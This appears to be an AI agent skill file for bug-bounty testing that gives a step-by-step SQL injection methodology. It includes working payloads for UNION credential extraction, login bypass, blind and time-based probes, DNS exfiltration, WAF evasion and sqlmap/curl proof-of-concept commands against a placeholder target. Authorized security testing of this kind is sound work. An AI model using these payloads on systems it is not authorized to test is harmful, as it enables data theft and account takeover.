---
name: sql-injection
description: "SQL injection — detect, confirm, minimally exploit (data exfil, auth bypass). Use when a param feeds SQL (WHERE/ORDER BY/INSERT), DB errors appear (SQL syntax/ORA-/SQLSTATE), login bypass (administrator'--), single-quote/OR 1=1/UNION SELECT; blind boolean/time-based (SLEEP/pg_sleep/WAITFOR), OAST exfil, stacked queries, JSON/XML body, second-order."
---

# SQL Injection

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test
Pursue any user-controlled value that reaches a SQL query:
- **WHERE clauses** (most common) — search, filters, `id=`, category, numeric and string params.
- **ORDER BY** — sort columns/direction (parameterized queries usually can't protect this; only column-index probes work, not quotes).
- **INSERT / UPDATE** — registration, profile updates, feedback (values and WHERE).
- **Table/column names** — injected into the query structure, not a value.
- **JSON / XML request bodies** — value inside a JSON field or XML node that maps to a SQL param.
- **Second-order** — input stored safely on request A, then concatenated into SQL when read back on request B (e.g. username set at signup, used unsafely in a later query).
Signals: verbose SQL errors, differential responses to `'` vs `''`, behaviour change on `OR 1=1`/`OR 1=2`, response-time change on time payloads.

## Impact & priority
SQLi is high-signal, usually **P1/P2**. It pays when you can prove: cross-table data exfiltration (credentials, PII, secrets), authentication bypass, or stacked-query/`xp_cmdshell`-class RCE. A confirmed extraction of out-of-scope-context data (e.g. another user's password hash, an admin row) is a clear, reportable finding. Speculative "the param looks injectable" is not.

## Detection (manual-first, ordered)
1. **Error probe** — submit `'` then `''`. A 500/SQL error on `'` that clears on `''` strongly implies injection. Note the DB from the error (ORA-, SQLSTATE, "unclosed quotation mark", `pg_`, `near ...`).
2. **Boolean differential** — string ctx: `' AND '1'='1` vs `' AND '1'='2`; numeric ctx: ` AND 1=1` vs ` AND 1=2`. A consistent content difference confirms boolean-blind injection.
3. **Logic subversion** — comment-out: `'--` , `Gifts'--`, `' OR 1=1--` (retrieve hidden rows / login bypass `administrator'--`).
4. **Time-based** (when no content/error signal) — inject a conditional delay (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`, `dbms_pipe.receive_message`). Confirm with a clean 0s control to rule out latency noise.
5. **OAST/DNS** (truly blind) — trigger an out-of-band lookup to your Collaborator/interactsh host. A received DNS hit is proof even with zero in-band signal.

Run a quiet control between probes; one slow response is not proof — require a repeatable, condition-correlated difference.

## Exploitation
**UNION (in-band, fastest extraction):**
1. Column count — `' ORDER BY 1--`, `2--`, `3--` … until error; or `' UNION SELECT NULL--`, `NULL,NULL--`, … until an extra row appears.
2. String-compatible column — `' UNION SELECT 'a',NULL,NULL--`, rotate the `'a'` through positions until no type-conversion error.
3. Extract — `' UNION SELECT username, password FROM users--`. Pack multiple values into one string column via DB concat (Oracle `||`, MSSQL `+`, MySQL `CONCAT()`).
4. Recon first — version (`@@version` / `v$version` / `version()`), then `information_schema.tables` / `.columns` (Oracle: `all_tables` / `all_tab_columns`).

**Blind — fingerprint the engine, then calibrate the oracle BEFORE extracting (saves dozens of wasted requests):**
- **Fingerprint string functions first.** `SUBSTRING`/`ASCII`/`MID`/`LENGTH` are NOT universal — e.g. **Apache Derby has no `ASCII()`** and uses `SUBSTR`; Oracle uses `SUBSTR`; MSSQL uses `SUBSTRING`+`ASCII`. Picking the wrong function makes every probe silently FALSE (the query errors → reads as "condition false") and you "extract" garbage (all spaces / all same char). Confirm the function works (`... AND SUBSTR(col,1,1) IS NOT NULL --` → expected TRUE) before looping.
- **Calibrate against a KNOWN value.** Run the extraction technique on a row whose value you already know (your own account's password, a public field) — the first char must match. Only trust extracted output once the calibration char is correct. An all-identical result column = broken function/oracle, not real data.
- **Don't binary-search on `ASCII()` if the DB lacks it** — fall back to direct charset equality `SUBSTR(col,pos,1)='c'`.
- Boolean — extract char-by-char with `SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s`.
- Conditional error — `... AND (SELECT CASE WHEN (cond) THEN 1/0 ELSE 'a' END)='a` (divide-by-zero only when true).
- Time — wrap the condition in a conditional delay (see cheatsheet.md per DB).
- OAST — exfil data into a DNS subdomain (MSSQL `xp_dirtree`, Oracle `EXTRACTVALUE`/`UTL_INADDR`, PG `copy ... to program`, MySQL `LOAD_FILE`).

Stop at proof. Extract the **one** value that demonstrates impact (e.g. `version()` plus a single admin credential) — do not dump whole tables.

**sqlmap (confirm/exploit only, AFTER manual triage):** once you've identified the param, context, and DB by hand, hand sqlmap the *narrow* job — never let it discover for you.
```bash
sqlmap -u 'https://TARGET/product?category=Gifts' -p category \
  --dbms=mysql --technique=U --batch --random-agent   # --technique to the one you confirmed (U/B/T/E/S)
# JSON body / non-GET: save the full request and feed it in (mark the inj point with *)
sqlmap -r req.txt -p category --dbms=mysql --technique=U --batch --random-agent
```
Escalate `--level`/`--risk` (default 1/1) only as a documented fallback when a hand-confirmed injection won't trigger at default — and say so in notes. **Never** run the `--crawl=1 --level=5 --risk=3 --forms` shotgun: it's slow, noisy, trips WAFs/lockouts, and produces unvalidated scanner findings this workspace rejects.

## Common bypasses
- Comments to terminate the query: `--`, `#` (MySQL), `/* */`; inline `/**/` to break up keywords.
- Filter/WAF evasion: case variation, encoding (URL/double-URL/unicode/hex), whitespace alternates (`/**/`, `%09`, `%0a`).
- Blocked quotes/keywords: numeric context needs no quotes; use char-code concat (`CHR()`/`CHAR()`) to build strings.
See reference.md for context-specific notes.

## Minimal PoC
String-context UNION extraction, suitable for `./_EXPLOIT/`:
```bash
# Confirm injection + extract DB version and one admin credential (proof of read access)
curl -sG 'https://TARGET/product' \
  --data-urlencode "category=Gifts' UNION SELECT NULL, @@version-- -" | grep -i 'microsoft\|mysql\|postgre\|oracle'

curl -sG 'https://TARGET/product' \
  --data-urlencode "category=x' UNION SELECT username, password FROM users WHERE username='administrator'-- -"
```
JSON-body API (modern SPA/mobile backend) — same injection inside the JSON string value:
```bash
curl -s https://TARGET/api/search -H 'Content-Type: application/json' \
  -d '{"category":"Gifts'"'"' UNION SELECT NULL,@@version-- -"}'
```
Drop the same break/boolean (`' AND '1'='1` vs `'2`) and time (`pg_sleep`/`SLEEP`) probes into the JSON string value. If a WAF parses the JSON, unicode-escape the SQL metachars to slip it (`'`→`\u0027`, `"`→`\u0022`, space→`\u0020`) — the JSON parser decodes them before the value reaches the query.
Time-based blind control vs. true:
```bash
time curl -s 'https://TARGET/item?id=1%20AND%20(SELECT%201%20FROM%20pg_sleep(0))'   # control ~0s
time curl -s 'https://TARGET/item?id=1%20AND%20(SELECT%201%20FROM%20pg_sleep(10))'  # ~10s = injectable
```
Log to `./_EXPLOIT/`: the exact request, the DB engine, and the single extracted value proving read access.

## Don't report as noise
- Reflected DB error text with **no** demonstrated injection (error disclosure alone is low/info, not P1).
- A `'` that 500s but where you cannot alter query logic or extract anything — keep probing, don't file it.
- Purely theoretical / scanner-flagged "possible SQLi" without a working PoC.
- Self-only impact with no cross-context data — only report if you proved access to data you shouldn't have.
Chain to RCE/stacked queries only when you have actually proven it (and stay in scope, non-destructive).

## Deep reference
See `reference.md` (full methodology, per-DB syntax, blind techniques, JSON/XML, second-order, prevention) and `cheatsheet.md` (copy-paste payloads per engine).
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection/examining-the-database
